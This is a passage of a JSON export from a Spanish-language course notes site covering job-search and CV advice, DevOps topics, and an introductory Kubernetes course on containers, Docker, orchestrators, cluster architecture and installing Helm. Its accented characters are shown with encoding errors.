{"Aplicaciones-web/index":{"title":"index","links":[],"tags":[],"content":"Texto"},"Aplicaciones-web/ra-criterios-contenidos-practicas":{"title":"ra-criterios-contenidos-practicas","links":[],"tags":[],"content":"Introducci√≥n a Python: tryhackme.com/r/room/pythonbasics"},"Despliegue-de-aplicaciones-web/consejos-busqueda-de-trabajo":{"title":"consejos-busqueda-de-trabajo","links":[],"tags":[],"content":"Consejos b√∫squeda de trabajo\nEsto es un boceto de consejos generales. Ya se terminar√° de escribir.\nConsejos:\n\nCrea una cuenta en linkedin. Recuerda generar el enlace corto a tu perfil. Rellena en linkedin informaci√≥n sobre experiencia laboral, proyectos, tecnolog√≠as que conoces, intereses‚Ä¶\nCrea una cuenta en infojobs. De nuevo, rellena la informaci√≥n relevante en tu perfil.\nCrea una cuenta en Github. Sube proyectos p√∫blicos interesantes que hayas hecho en alg√∫n momento y te sientas orgulloso de ello. Recuerda redactar archivos Readme.md para entenderlos.\nCrea una web como portfolio. Algo muy sencillo es hacerlo con github pages. En ese portfolio describe tus intereses, proyectos interesantes, trabajos que hayas hecho, experiencia con herramientas o tecnolog√≠as, etc‚Ä¶\nCompra un dominio propio, algo parecido a www.nombreApellido.com. Lo puedes registrar a trav√©s de cloudflare.\nVincula tu dominio con tu web de portfolio. Ahora genera un c√≥digo QR con dicha web.\nCrea un curr√≠culum en papel (o formato folio/pdf). Puedes emplear la herramienta Canva para ello. En dicho curr√≠culum incluye los enlaces a tu perfil en github, linkedin e infojobs. Recuerda tambi√©n incluir el c√≥digo QR a tu p√°gina web portfolio. Rellena en el curr√≠culum tus intereses, tecnolog√≠as, proyectos, experiencia laboral y otros m√©ritos. Recuerda ser conciso. Debe ocupar 1 carilla o 2 como m√°ximo. Nunca m√°s de 2.\nLa foto de tus redes de networking y curr√≠culum debe ser profesional. Fondo blanco, transparente o desenfocado. Usa una camisa mejor que una camiseta. No salgas completamente de frente respecto a la c√°mara, mejor girar un poco el cuerpo y la cabeza.\n\nC√≥mo hacer el cv de papel:\n\nPoner foto. Normalmente suele ser un tema pol√©mico, pero en general recomiendo a√±adir la foto.\nA la derecha de la foto recomiendo a√±adir datos generales y contacto:\n\nnombre, apellidos, tel√©fono, email.\nNo suele recomendar poner fecha nacimiento, ni edad, ni direcci√≥n.\nfoto la suelo poner (fondo blanco, no de frente, camisa).\n\n\nDebajo de los datos de contacto:\n\nEnlace de tu perfil de linkedin, infojobs, github, portfolio, tryhackme/hackthebox/cyberdefenders/lets defend.\n\n\nSi la web de porfolio es muy buena, recomiendo generar un QR del enlace de la web y ponerla debajo de la foto de perfil.\nA la derecha del QR del portfolio recomiendo a√±adir un p√°rrafo o dos hablando de aspectos generales/introductorios/intereses sobre ti (proactivo, resolutivo, autodidacta).\nDebajo del QR y del p√°rrafo de descripci√≥n entramos en una secci√≥n donde mostramos qu√© sabemos:\n\nexperiencia laboral o proyectos (3-4 como m√°ximo) (las pr√°cticas es un ejemplo de experiencia laboral). Cada una de las experiencias laborales debe tener:\n\nNombre de la empresa - Cargo ( PE: desarrollador backend) - Fecha\nDescripci√≥n de lo que hiciste\nListado de tecnolog√≠as que usaste\n\n\nCon los proyectos que hayas hecho por tu cuenta sucede algo similar:\n\nNombre del proyecto, enlace (si est√° desplegado, por ejemplo, en github pages, infinityfree‚Ä¶) y fecha\nDescripci√≥n del proyecto\nTecnolog√≠as usadas.\n\n\n\n\nDebajo de la experiencia: formaci√≥n\n\nDAW\nASIR\nDAM\nSMR\nIngl√©s B2/C1\nNO recomiendo incluir la ESO o el bachiller.\n\n\nOtras formaciones/certificados\n\nCCNA (Cisco)\nEJPT\nCarn√© de conducir\n\n\nSolo si es relevante: Inquietudes\n"},"Despliegue-de-aplicaciones-web/devops":{"title":"devops","links":[],"tags":[],"content":"DevOps\nTODO: Algunas ideas que desarrollar en el futuro.\nMetodolog√≠a: Scrum (Agile) + Kanban\nCI/CD: Jenkins/Github actions\nTest unitarios, test de integraci√≥n, calidad de c√≥digo y vulnerabilidades: Jest + Sonarqube\nInfrastructure as Code: Terraform + ansible\nIaaS (ec2) vs PaaS (Vercel)\nTDD (Test Driven Development)\nAWS / Azure"},"Despliegue-de-aplicaciones-web/index":{"title":"Despliegue de aplicaciones web","links":["Despliegue-de-aplicaciones-web/kubernetes/","Despliegue-de-aplicaciones-web/consejos-busqueda-de-trabajo","Despliegue-de-aplicaciones-web/devops"],"tags":[],"content":"\nKubernetes\nconsejos-busqueda-de-trabajo\ndevops\n"},"Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.0-introduccion-a-kubernetes":{"title":"1.0-introduccion-a-kubernetes","links":[],"tags":[],"content":"1. Introducci√≥n a Kubernetes\nEn los √∫ltimos a√±os se ha ido extendiendo el uso de contenedores como elementos esenciales para el uso de aplicaciones en entornos en producci√≥n, tanto m√°s cuanto m√°s variable sea la demanda, la frecuencia con la que se actualizan o la necesidad de que funcionen de forma ininterrumpida.\nGestionar una aplicaci√≥n sobre contenedores, que pueda actualizarse r√°pidamente, que sea escalable o tolerante a fallos, es una tarea compleja que se realiza mediante un software espec√≠fico que recibe el nombre de orquestador de contenedores.\nKubernetes es un software de orquestaci√≥n de contenedores desarrollado inicialmente por Google, pero que hoy en d√≠a es un proyecto libre independiente utilizado en gran cantidad de entornos diferentes y que se ha convertido en muchos casos en la soluci√≥n preferida para orquestar aplicaciones basadas en contenedores en entornos en producci√≥n.\nEn este curso conoceremos las principales caracter√≠sticas de Kubernetes y de las aplicaciones m√°s adecuadas para poner en este entorno y comprobaremos de forma pr√°ctica la tolerancia a fallos, la escalabilidad de una aplicaci√≥n o la gesti√≥n del versionado y los diferentes enfoques a la hora de hacerlo en entornos en producci√≥n, con o sin interrupciones."},"Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.1-implantacion-de-aplicaciones-web-en-contenedores":{"title":"1.1-implantacion-de-aplicaciones-web-en-contenedores","links":[],"tags":[],"content":"1.1 Implantaci√≥n de aplicaciones web en contenedores\nEl protocolo http, o su extensi√≥n https, ha ido convirti√©ndose poco a poco en el ‚Äúsuperprotocolo‚Äù de Internet y ha ido desplazando paulatinamente el uso de otros protocolos.\nDe igual forma, la mayor parte del software que se consume hoy en d√≠a se podr√≠a denominar de forma gen√©rica como aplicaci√≥n web, aunque hay diferencias importantes sobre la forma de presentarse, ya que no es lo mismo que una persona acceda a una aplicaci√≥n a trav√©s de un navegador, a trav√©s de una aplicaci√≥n m√≥vil o que quien acceda a la aplicaci√≥n sea una m√°quina.\nEn este curso no podemos entrar en detalle sobre las caracter√≠sticas de estas aplicaciones web, pero s√≠ en las caracter√≠sticas que deben tener los sistemas que las ofrecen para que cumplan con los requisitos esperados.\nRequisitos habituales de las aplicaciones web\nPensemos inicialmente en el caso de una aplicaci√≥n interna de una empresa que est√° instalada localmente y que los √∫nicos usuarios que tiene son la plantilla de empleados de la empresa. En ese caso, es f√°cil determinar los recursos necesarios para que la aplicaci√≥n funcione de forma adecuada, porque ni el uso de la aplicaci√≥n se dispara en unos instantes, ni el n√∫mero de empleados de una empresa var√≠a de forma abrupta.\nPor otra parte, las actualizaciones se pueden hacer en momentos en los que el uso es m√≠nimo y, si es necesario una interrupci√≥n del servicio, se puede programar para un momento determinado en que tenga muy poco impacto. Las aplicaciones de este tipo no se suelen modificar habitualmente, sino que lo hacen de forma bastante espaciada en el tiempo, por lo que los cambios entre una versi√≥n y otra son significativos. Esto, que podr√≠amos llamar inform√°tica tradicional, tambi√©n tiene un impacto importante en la forma de desarrollar las aplicaciones que funcionan bajo este esquema.\nPor otra parte, una aplicaci√≥n web que est√© disponible en Internet, tiene miles de millones de potenciales usuarios, que la pueden usar las 24 horas del d√≠a y cualquier d√≠a del a√±o. Esto tiene unas consecuencias muy importantes, ya que es muy dif√≠cil determinar los recursos necesarios para prestar servicios a una demanda muy variable e idealmente, el servicio no puede interrumpirse nunca.\nPero, ¬øesto c√≥mo se hace?. ¬øEs posible que el mismo sistema se ajuste a una demanda que puede variar de un usuario a un mill√≥n?, ¬øes posible tener un sistema siempre actualizado y que a la vez no se pare?, ¬øc√≥mo se aplican las actualizaciones de software?, ¬øpoco a poco o con grandes saltos?. Durante este curso, veremos que precisamente esto es lo que trata de proporcionar Kubernetes.\nComponentes auxiliares de un servicio web\nEl componente esencial para servir una aplicaci√≥n web es un servidor web, pero vamos a ver a continuaci√≥n, que para poder proporcionar el servicio con los requisitos anteriores, debe apoyarse en un n√∫mero importante de componentes auxiliares. En los siguientes apartados vamos a ir viendo paso a paso la forma de ir incluyendo diferentes componentes auxiliares y c√≥mo esta inclusi√≥n va a ir cambiando la arquitectura de los sistemas que proporcionan el servicio.\nPaso 1. Punto de partida\nSupongamos que nuestra organizaci√≥n proporciona tres aplicaciones web diferentes que son accesibles a trav√©s de las URL:\nexample.com/app1\nexample.com/app2\nexample.com/app3\nEstas aplicaciones pueden estar desarrolladas en el mismo lenguaje o en varios diferentes (Python, Java, PHP, etc.), pueden utilizar una base de datos, almacenamiento auxiliar y como se sirven a trav√©s de https, es necesario gestionar los certificados x509.\nEl esquema inicial que pensar√≠amos para proporcionar estas tres aplicaciones ser√≠a una m√°quina (f√≠sica o virtual) en la que instalar√≠amos el servidor web, los servidores de aplicaciones (php, java, ‚Ä¶), el servidor de bases de datos, etc‚Ä¶ tal y como aparece en la siguiente imagen:\n\nPaso 2. Servidor de bases de datos separado\nDesde un punto de vista de seguridad, ubicar el servidor de bases de datos en el mismo equipo que el servidor web es totalmente inadecuado, ya que el servidor web, por su propia naturaleza debe permitir que cualquier usuario acceda desde Internet y una vulnerabilidad en este equipo podr√≠a exponer los datos que se ubican en las bases de datos a un potencial atacante. Adem√°s, desde el punto de vista del rendimiento y la disponibilidad, separar los servicios en diferentes equipos hace que no haya interacciones entre ellos y no compitan por los mismos recursos.\n\nPaso 3. Servidores de aplicaciones en equipos separados\nEl coste computacional mayor en una aplicaci√≥n web suele recaer en los servidores de aplicaciones, que son los que ejecutan c√≥digo complejo, mientras que el servidor web se limita a servir el contenido generado por estos servidores de aplicaciones o los ficheros est√°ticos del sitio web. Al servir tres aplicaciones web diferentes desde el mismo equipo, podemos tener importantes interacciones entre ellas y que un aumento de uso de una aplicaci√≥n, repercuta negativamente en las otras. Es por esto, por lo que se puede separar estos servidores de aplicaci√≥n en equipos dedicados para cada una de ellas. La funci√≥n del servidor web en este caso, se acerca m√°s a la de un proxy inverso, que pasa la petici√≥n web a un equipo interno (el servidor de aplicaciones).\n\nPaso 4. Cach√© SQL\nLos servidores de aplicaciones consultan continuamente a los servidores de bases de datos y cada consulta conlleva un importante coste computacional y una ralentizaci√≥n de la respuesta. Si la misma consulta ya se ha realizado antes, se puede acelerar mucho la velocidad de respuesta con menor coste computacional utilizando un servicio de cach√© SQL, de manera que los servidores de aplicaciones se configuran para consultar al servidor cach√©, que servir√° directamente la respuesta si ya lo ha hecho anteriormente, o consultar√° al servidor de bases de datos en caso necesario. Memcached o redis son dos opciones muy utilizadas como cach√© SQL.\n\nPaso 5. Cach√© HTTP\nAl igual que se puede cachear la respuesta del servidor de bases de datos, se puede hacer lo mismo con la del servidor de aplicaciones o el servidor web. Dependiendo del servidor de aplicaciones, se puede ubicar este componente delante del servidor web o entre √©ste y el servidor de aplicaciones. Dicho de otro modo, podemos cachear http o alg√∫n otro protocolo como CGI, WSGI, etc. Un software muy conocido de cach√© http es varnish.\n\nPaso 6. Varios servidores de aplicaciones\nSi la demanda de alguna de las aplicaciones var√≠a de forma importante, se puede utilizar escalado horizontal, aumentando el n√∫mero de nodos de estos servidores de aplicaciones a la demanda de cada momento. Esto conlleva dos importantes modificaciones, el almacenamiento entre los servidores de aplicaci√≥n de la misma aplicaci√≥n tiene que estar distribuido de forma que garantice el uso concurrente y se deben repartir las peticiones a los diferentes servidores de aplicaci√≥n a trav√©s de un balanceador de carga.\n\nPaso 7. Alta disponibilidad en el resto de componentes\nNo solo se pueden escalar horizontalmente los servidores de aplicaciones, sino que si queremos ofrecer realmente alta disponibilidad en todos los niveles, debemos crear una arquitectura en la que la disponibilidad nunca dependa de uno solo nodo y el sistema pueda responder siempre ante incidencias puntuales en cualquier nivel.\n\nPaso 8. Microservicios y aplicaciones ‚Äútradicionales‚Äù\nUna de las opciones que se considera m√°s adecuada hoy en d√≠a para el desarrollo y puesta en producci√≥n de aplicaciones web es la utilizaci√≥n de microservicios. Con este enfoque los propios componentes de la aplicaci√≥n se separan en m√∫ltiples componentes que se ejecutan en nodos independientes (t√≠picamente contenedores) y se comunican unos con otros a trav√©s de servicios en red que ofrecen al resto.\nEstos microservicios no solo incluir√≠an de forma independiente los componentes que hemos explicado hasta ahora, sino que principalmente se refiere a la separaci√≥n de los componentes internos de la aplicaci√≥n en diferentes microservicios.\n\nPaso 9. Escalabilidad en los microservicios\nAl ofrecer microservicios no podemos tener dependencia de un solo nodo, por lo que al igual que en los pasos anteriores, se debe ofrecer la posibilidad de escalar cualquier componente a la demanda y que el sistema globalmente pueda responder ante cualquier error puntual.\n\nPaso 10. Microservicios en todas las aplicaciones\nEn lugar de utilizar microservicios en una aplicaci√≥n, podr√≠amos utilizarlos en todas, pero manteniendo los componentes auxiliares gestionados aparte.\n\nPaso 11. Todo en microservicios\nO podr√≠amos tener todo definido internamente en microservicios, tanto los componentes de cada aplicaci√≥n, como los componentes auxiliares.\n\nContenedores\nEn parte por lo que hemos explicado aqu√≠, y en parte por las ventajas que proporciona en el desarrollo de software y en el r√°pido despliegue, muchos de los componentes que hemos presentado se ejecutan no sobre m√°quinas virtuales o f√≠sicas, sino que lo hacen sobre contenedores de aplicaciones tipo docker (hoy en d√≠a se plantean otras alternativas como podman o containerd, pero no vamos a entrar en esa explicaci√≥n). Docker es capaz de gestionar esos contenedores de forma √°gil y r√°pida, pero no tiene funcionalidad para ejecutar escenarios tan complejos como los anteriores, que adem√°s se ejecutar√≠an l√≥gicamente en diferentes nodos f√≠sicos o virtuales (que a su vez ejecutar√≠an docker para los componentes de la aplicaci√≥n).\nConclusi√≥n\nEsto no son m√°s que un conjunto de componentes y una explicaci√≥n muy r√°pida de ellos, el orden y la ubicaci√≥n de ellos es variable en funci√≥n del caso de uso, pero en cualquier caso quer√≠amos presentarlos aqu√≠ para tener una visi√≥n global de hacia d√≥nde vamos. Algo que claramente podemos ver es que la gesti√≥n de este tipo de aplicaciones se convierte pronto en algo muy complejo, por lo que necesitamos apoyarnos en alg√∫n software que controle y gestione de forma adecuada estos sistemas tan complejos."},"Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.2-docker":{"title":"1.2-docker","links":[],"tags":[],"content":"1.2 Docker\nDocker es una empresa (Docker Inc.) que desarrolla un software con el mismo nombre, de forma m√°s concreta el software denominado (docker engine), que ha supuesto una revoluci√≥n en el desarrollo de software, muy ligado al uso de contenedores de aplicaciones, a las aplicaciones web y al desarrollo √°gil.\nDocker permite gestionar contenedores a alto nivel, proporcionando todas las capas y funcionalidad adicional y, lo m√°s importante de todo, es que proporciona un nuevo paradigma en la forma de distribuir las aplicaciones, ya que se crean im√°genes en contenedores que se distribuyen, de manera que el contenedor que se ha desarrollado es id√©ntico al que se utiliza en producci√≥n y deja de instalarse la aplicaci√≥n de forma tradicional.\nComponentes de docker\nDocker engine tiene los componentes que a grosso modo se presentan a continuaci√≥n:\n\nEn la imagen se han destacado los componentes que son relevantes desde el punto de vista de este curso, ya que como veremos m√°s adelante, docker podr√≠a ser un componente esencial de Kubernetes, pero realmente no lo es completo, solo containerd y los elementos que √©ste proporciona lo son, ya que k8s utiliza su propia API, su propia l√≠nea de comandos y gestiona el almacenamiento y las redes de forma independiente a docker.\nEvoluci√≥n del proyecto docker\nDocker tuvo un enorme √©xito y una gran repercusi√≥n, pero la empresa que lo desarrolla siempre se ha movido en el dilema de c√≥mo sacar rendimiento econ√≥mico a su software, que al ser desarrollado bajo licencia libre, no proporciona beneficio como tal. Este dilema se ha tratado de resolver con modificaciones en la licencia o con doble licenciamiento (docker CE y docker EE en estos momentos), pero esto a su vez ha propiciado que otras empresas desarrollasen alternativas a docker para no depender en el futuro de una empresa sin un modelo de negocio claro y ante posibles modificaciones de la licencia libre de docker.\nLos cambios m√°s significativos que han ocurrido en docker se enumeran a continuaci√≥n:\n\nMoby Docker engine se desarrolla ahora como proyecto de software libre independiente de Docker Inc. denomin√°ndose Moby. De este proyecto se surten las distribuciones de linux para desarrollar los paquetes docker.io\nDocker Engine Versi√≥n desarrollada por Docker Inc.\nrunC Componente que ejecuta los contenedores a bajo nivel. Actualmente desarrollado por OCI\ncontainerd Componente que ejecuta los contenedores e interact√∫a con las im√°genes. Actualmente desarrollado por la CNCF.\n\nLimitaciones de docker (docker engine)\nDocker (docker engine) gestiona completamente la ejecuci√≥n de un contenedor en un determinado nodo a partir de una imagen, pero no proporciona toda la funcionalidad que necesitamos para ejecutar aplicaciones en entornos en producci√≥n.\nExisten diferentes preguntas que nos podemos hacer acerca de esto :\n\n¬øQu√© hacemos con los cambios entre versiones?\n¬øC√≥mo hacemos los cambios en producci√≥n?\n¬øC√≥mo se balancea la carga entre m√∫ltiples contenedores iguales?\n¬øC√≥mo se conectan contenedores que se ejecuten en diferentes demonios de docker?\n¬øSe puede hacer una actualizaci√≥n de una aplicaci√≥n sin interrupci√≥n?\n¬øSe puede variar a demanda el n√∫mero de r√©plicas de un determinado contenedor?\n¬øEs posible mover la carga entre diferentes nodos?\n\nLas respuestas a estas preguntas no pueden venir de docker engine, ya que no es un software desarrollado para eso, tiene que venir de alg√∫n software que pueda utilizar docker o parte de √©l y que sea capaz de comunicar m√∫ltiples nodos para proporcionar de forma coordinada estas funcionalidades. Ese software se conoce de forma gen√©rica como orquestador de contenedores."},"Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.3-orquestadores-de-contenedores":{"title":"1.3-orquestadores-de-contenedores","links":[],"tags":[],"content":"1.3 Orquestadores de contenedores\nTan pronto como se fue extendiendo el uso de docker para el desarrollo de aplicaciones web, surgi√≥ la necesidad de desarrollar software de orquestadores de contenedores para gestionar de forma coordinada m√∫ltiples nodos en los que se estuvieran ejecutando contenedores y para proporcionar funcionalidad no ofrecida por docker engine y que es necesaria en la puesta en producci√≥n de la aplicaci√≥n.\nDocker swarm\nL√≥gicamente la propia empresa Docker Inc. comenz√≥ pronto el desarrollo de su orquestador que extend√≠a la funcionalidad de docker y cre√≥ el proyecto Swarm (enjambre), aunque en las √∫ltimas versiones de docker-engine, ya se incluye swarm como un componente y no es necesario instalarlo de forma separada.\nActualmente se considera que docker swarm es una soluci√≥n de orquestaci√≥n de contenedores sencilla y que es adecuada para determinados entornos no muy exigentes, pero no puede competir con Kubernetes en grandes entornos expuestos a Internet. Su desarrollo contin√∫a, pero ya no como un competidor de Kubernetes, de hecho la propia Docker Inc. publicita Kubernetes como un producto sobre el que ofrecen servicios.\nApache Mesos\nApache Mesos es un proyecto de software libre que proporciona un orquestador de contenedores. Este proyecto actualmente est√° bajo el paraguas de la Apache Software Foundation, pero originalmente fue desarrollado por la empresa Mesosphere, hoy renombrada a D2iQ. Mesos ha ido derivando de un competidor de Kubernetes hacia un software que proporcione soluciones m√°s espec√≠ficas, como DC/OS.\nHashicorp Nomad\nNomad es un proyecto de la prestigiosa empresa Hashicorp (Vagrant, Terraform, etc.) y su idea es ser un software de orquestaci√≥n m√°s simple, que se centre en la gesti√≥n del cluster de nodos y la ejecuci√≥n de contenedores en ellos, pero sin proporcionar todo el resto de funcionalidad adicional, por lo que Nomad se utiliza junto a otro software cuando se pone en producci√≥n."},"Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.4-el-proyecto-kubernetes":{"title":"1.4-el-proyecto-kubernetes","links":[],"tags":[],"content":"1.4 El proyecto Kubernetes\nEl proyecto Kubernetes lo inicia Google en 2014 como un software (libre) para orquestar contenedores. En aquel momento hab√≠a varios proyectos de software que quer√≠an extender las posibilidades del uso de contenedores de aplicaciones tipo docker a entornos en producci√≥n, lo que de forma gen√©rica se conoce como orquestadores de contenedores. A diferencia del resto, Kubernetes no es un proyecto que se desarrolla desde cero, sino que aprovecha todo el conocimiento que ten√≠a Google con el uso de la herramienta interna Borg, de manera que cuando se hace p√∫blica la primera versi√≥n de Kubernetes, ya era un software con muchas funcionalidades.\nUn proyecto se convierte en software libre cuando utiliza una licencia libre, pero otro aspecto importante es la gobernanza del proyecto, es decir, si el desarrollo es abierto o no, si las decisiones sobre las nuevas funcionalidades las toma una empresa o se consens√∫an, etc. Si un proyecto de software libre lo inicia una √∫nica empresa, siempre existe la desconfianza de que ese proyecto vaya a ir encaminado a beneficiar a esa empresa. En este caso, la empresa en cuesti√≥n era un gigante como Google, por lo que aunque el proyecto era muy interesante, exist√≠a cierto recelo de gran parte del sector inicialmente. Para conseguir que una parte importante del sector se sumase al proyecto, Google tom√≥ la decisi√≥n de desvincularse del mismo y ceder el control a la Cloud Native Compute Foundation (CNCF), por lo que Kubernetes es un proyecto de software libre de fundaci√≥n, en el que se admiten contribuciones de forma abierta y donde las reglas de la gobernanza recaen sobre los miembros de la fundaci√≥n, normalmente un conjunto amplio de grandes empresas del sector. Es decir, aunque hoy en d√≠a hay quien habla de Kubernetes como el software de orquestaci√≥n de contenedores de Google, esto es un error, es un proyecto que gestiona desde hace a√±os la CNCF, a la que ni siquiera pertenece Google.\n¬øQu√© es Kubernetes?\nKubernetes es un software pensado para gestionar completamente el despliegue de aplicaciones sobre contenedores, realizando este despliegue de forma completamente autom√°tica y poniendo un gran √©nfasis en la escalabilidad de la aplicaci√≥n, as√≠ como el control total del ciclo de vida. Por destacar algunos de los puntos m√°s importantes de Kubernetes, podr√≠amos decir:\n\nDespliega aplicaciones r√°pidamente\nEscala las aplicaciones al vuelo\nIntegra cambios sin interrupciones\nPermite limitar los recursos a utilizar\n\nKubernetes est√° centrado en la puesta en producci√≥n de contenedores y por su gesti√≥n es indicada para administradores de sistemas y personal de equipos de operaciones. Por otra parte, afecta tambi√©n a los desarrolladores, ya que las aplicaciones deben adaptarse para poder desplegarse en Kubernetes.\nCaracter√≠sticas principales\nKubernetes surge como un software para desplegar aplicaciones sobre contenedores que utilicen infraestructura en nube (p√∫blica, privada o h√≠brida). Aunque puede desplegarse tambi√©n en entornos m√°s tradicionales como servidores f√≠sicos o virtuales, no es su ‚Äúentorno natural‚Äù.\nKubernetes es extensible, por lo que cuenta con gran cantidad de m√≥dulos, plugins, etc.\nEl nombre del proyecto proviene de una palabra de griego antiguo que significa timonel y habitualmente se escribe de forma abreviada como k8s.\nCaracter√≠sticas del software\nKubernetes est√° desarrollado en el lenguaje Go como diversas aplicaciones de este sector. La primera versi√≥n de Kubernetes se public√≥ el 7 de junio de 2014, aunque la m√°s antigua disponible en el repositorio es la v0.2, de septiembre de 2014.\nLa licencia utilizada en Kubernetes es la Apache License v2.0, licencia de software libre permisiva, muy utilizada √∫ltimamente en proyectos de fundaci√≥n en los que est√°n involucrados empresas, ya que no se trata de una licencia copyleft, que no permitir√≠a su inclusi√≥n en software que no sea libre, mientras que la licencia Apache s√≠ lo permite en determinadas circunstancias.\nEl c√≥digo de Kubernetes se gestiona a trav√©s de Github en cuyo repositorio se puede ver la gran cantidad de c√≥digo desarrollado en estos a√±os (m√°s de 100000 ‚Äúcommits‚Äù) y las miles de personas que han participado en mayor o menor medida. La √∫ltima versi√≥n de Kubernetes en el momento de escribir esta documentaci√≥n es la 1.23 y el proyecto actualmente est√° publicando dos o tres versiones nuevas cada a√±o.\nEn cualquier caso la versi√≥n de Kubernetes no es algo esencial para los contenidos de este curso, porque se van a tratar los elementos b√°sicos, que ya est√°n muy establecidos y, salvo alg√∫n detalle menor, se puede realizar este curso al completo con una versi√≥n de Kubernetes diferente a la utilizada para la documentaci√≥n.\nEl ecosistema\nDe entre todas las opciones de orquestadores de contenedores disponibles, hoy se considera que la opci√≥n preferida en la mayor parte de los casos es k8s y se ha desarrollado un enorme ecosistema de aplicaciones alrededor que proporcionan algunas funcionalidades que no tiene k8s o que de alguna forma utiliza o se pueden integrar de diferente forma con k8s. Este ecosistema de aplicaciones est√° actualmente en plena ‚Äúebullici√≥n‚Äù y es posible que en unos a√±os algunos de esos proyectos se estabilicen y otros desaparezcan, ya que en muchos casos solapan unos con otros.\nlandscape.cncf.io/"},"Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.5-arquitectura-basica-de-kubernetes":{"title":"1.5-arquitectura-basica-de-kubernetes","links":[],"tags":[],"content":"1.5 Arquitectura b√°sica de Kubernetes\nNodos\nk8s es un software que se instala en varios nodos que se gestionan de forma coordinada, es decir, un cl√∫ster de nodos. Aunque es posible en casos muy peculiares instalar algunos nodos sobre sistemas Windows, la situaci√≥n normal es que se trate de un cluster de nodos linux. No es necesario que todos los nodos tengan la misma versi√≥n y ni siquiera que sean la misma distribuci√≥n, aunque en muchos casos s√≠ lo sea por simplicidad en el despliegue y mantenimiento.\nLos nodos del cl√∫ster pueden ser m√°quinas f√≠sicas o virtuales, pero quiz√°s lo m√°s habitual es que se traten de instancias de nube de infraestructura, es decir, m√°quinas virtuales ejecut√°ndose en alg√∫n proveedor de IaaS (AWS, GCP, OpenStack, etc.)\nSe distingue entre dos tipos de nodos:\n\nLos nodos master: Son los que ejecutan los servicios principales de k8s y ordenan a los otros nodos los contenedores que deben ejecutar. Como el uso del t√©rmino master es √∫ltimamente muy controvertido en los paises de habla inglesa, se est√° cambiando su denominaci√≥n por control plane node.\nLos nodos worker: Son los que reciben las √≥rdenes de los controladores y en los que se ejecutan los contenedores de las aplicaciones.\n\nComponentes de un nodo master\n\nkube-apiserver Gestiona la API de k8s\netcd Almac√©n clave-valor que guarda la configuraci√≥n del cl√∫ster\nkube-scheduler Selecciona el nodo donde ejecutar los contenedores\nkube-controller-manager Ejecuta los controladores de k8s\ndocker/rkt/containerd/‚Ä¶ Ejecuta los contenedores que sean necesarios en el controlador\ncloud-controller-manager Ejecuta los controladores que interact√∫an con el proveedor de nube:\n\nnodos\nenrutamiento\nbalanceadores\nvol√∫menes\n\n\n\nComponentes de un nodo worker\n\nkubelet Controla los Pods asignados a su nodo\nkube-proxy Permite la conexi√≥n a trav√©s de la red\ndocker/rkt/containerd/‚Ä¶ Ejecuta los contenedores\nsupervisord Monitoriza y controla kubelet y docker\n\nComplementos (addons)\nLos elementos anteriores forman la estructura b√°sica de k8s, pero es muy habitual que se proporcione funcionalidad adicional a trav√©s de complementos de k8s, que en muchas ocasiones se ejecutan a su vez como contenedores y son gestionados por el propio Kubernetes. Algunos de estos complementos son:\n\nCluster DNS Proporciona registros DNS para los servicios de k8s. Normalmente a trav√©s de CoreDNS\nWeb UI Interfaz web para el manejo de k8s\nContainer Resource Monitoring Recoge m√©tricas de forma centralizada. M√∫ltiples opciones: prometheus, sysdig\nCluster-level Logging Almacena y gestiona los logs de los contenedores\n\nEsquema de nodos y componentes\nSe crea un cluster de k8s en los que algunos nodos act√∫an como master (normalmente se crea un conjunto impar de nodos master que proporcionen alta disponibilidad) y el resto act√∫a como worker en los que se ejecutan los contenedores de las aplicaciones. Los nodos se comunican entre s√≠ a trav√©s de una red que proporciona la capa de infraestructura y se crea una red para la comunicaci√≥n de los contenedores, que suele ser una red de tipo overlay.\n"},"Despliegue-de-aplicaciones-web/kubernetes/10.-instalacion-de-aplicaciones-en-kubernetes-con-helm/10.0-instalacion-de-aplicaciones-en-kubernetes-con-helm":{"title":"10.0-instalacion-de-aplicaciones-en-kubernetes-con-helm","links":[],"tags":[],"content":"10. Instalaci√≥n de aplicaciones en Kubernetes con Helm\nComo hemos estudiado en las unidades anteriores, una aplicaci√≥n real completa se compone de un conjunto amplio de objetos que definen Deployments, ConfigMaps, Services, etc. La API de Kubernetes no nos ofrece un ‚Äúsuperobjeto‚Äù que defina una aplicaci√≥n completa.\nNecesitamos herramientas para gestionar la aplicaci√≥n completa: empaquetado, instaladores, control de la aplicaci√≥n en producci√≥n, etc. En esta unidad vamos a estudiar Helm, que es un software que nos permite empaquetar aplicaciones completas y gestionar el ciclo completo de despliegue de dicha aplicaci√≥n.\nHelm usa un formato de empaquetado llamado charts. Un chart es una colecci√≥n de archivos que describen un conjunto de recursos que nos permite desplegar una aplicaci√≥n en Kubernetes.\nLos charts son distribuidos en distintos repositorios, que podremos dar de alta en nuestra instalaci√≥n de Helm. Para buscar los distintos charts y los repositorios desde los que se distribuyen podemos usar la p√°gina Artifact Hub."},"Despliegue-de-aplicaciones-web/kubernetes/10.-instalacion-de-aplicaciones-en-kubernetes-con-helm/10.1-instalacion-de-helm":{"title":"10.1-instalacion-de-helm","links":[],"tags":[],"content":"10.1 Instalaci√≥n de Helm\nOcultar\nHelm se distribuye como un √∫nico binario que podemos instalar de distintas formas. La √∫ltima versi√≥n del programa la podemos encontrar en esta p√°gina y podemos ver los distintos m√©todos de instalaci√≥n en la documentaci√≥n oficial.\nUna vez instalado podemos ver la versi√≥n de Helm que tenemos instalada:\nhelm version\n\nLos siguiente es indicar un repositorio para que podamos empezar a trabajar con helm, para ello:\nhelm repo add &quot;stable&quot; &quot;charts.helm.sh/stable&quot; --force-update\n\nY ahora el repositorio stable corresponde a charts.helm.sh/stable:\nhelm repo list\nNAME  \tURL                          \nstable\tcharts.helm.sh/stable\n"},"Despliegue-de-aplicaciones-web/kubernetes/10.-instalacion-de-aplicaciones-en-kubernetes-con-helm/10.2-gestion-de-charts-y-despliegue-de-aplicaciones":{"title":"10.2-gestion-de-charts-y-despliegue-de-aplicaciones","links":[],"tags":[],"content":"10.2 Gesti√≥n de charts y despliegue de aplicaciones\nComo hemos visto anteriormente, por defecto, tenemos instalado un repositorio:\nhelm repo list\nNAME  \tURL                  